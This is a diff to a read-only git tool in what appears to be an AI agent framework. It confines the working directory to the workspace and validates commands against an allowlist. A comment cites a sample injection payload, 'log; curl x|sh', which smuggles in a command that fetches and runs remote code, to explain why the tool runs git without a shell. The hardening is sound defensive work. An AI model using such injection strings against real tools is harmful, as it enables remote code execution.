@@ -1,7 +1,9 @@
 """Git tool — read-only git operations (log, diff, status, show)."""
 
 import asyncio
+from pathlib import Path
 from synapse.protocols.tool import Tool, ToolSchema, ToolResult, ToolCallMetadata, RiskLevel, ToolCategory
+from synapse.modules.tools.workspace import WorkspacePathError, resolve_workspace_path
 
 READ_ONLY_COMMANDS = {"log", "diff", "show", "status", "blame", "branch", "tag", "rev-parse"}
 
@@ -25,10 +27,16 @@ class GitTool:
     risk_level = RiskLevel.READ_ONLY
     category = ToolCategory.CODE_UNDERSTANDING
 
+    def __init__(self, workspace_root: str | None = None):
+        self._workspace_root = Path(workspace_root).resolve() if workspace_root else None
+
     async def execute(self, params: dict, sandbox=None) -> ToolResult:
         command = params["command"]
-        cwd = params.get("cwd", ".")
         meta = ToolCallMetadata(tool_name="git")
+        try:
+            cwd = resolve_workspace_path(params.get("cwd", "."), self._workspace_root)
+        except (WorkspacePathError, ValueError) as e:
+            return ToolResult(success=False, output="", error=str(e), metadata=meta)
 
         # Validate the first token, then run via argv (no shell) so a payload
         # like "log; curl x|sh" cannot escape — split()[0] == "log" would have
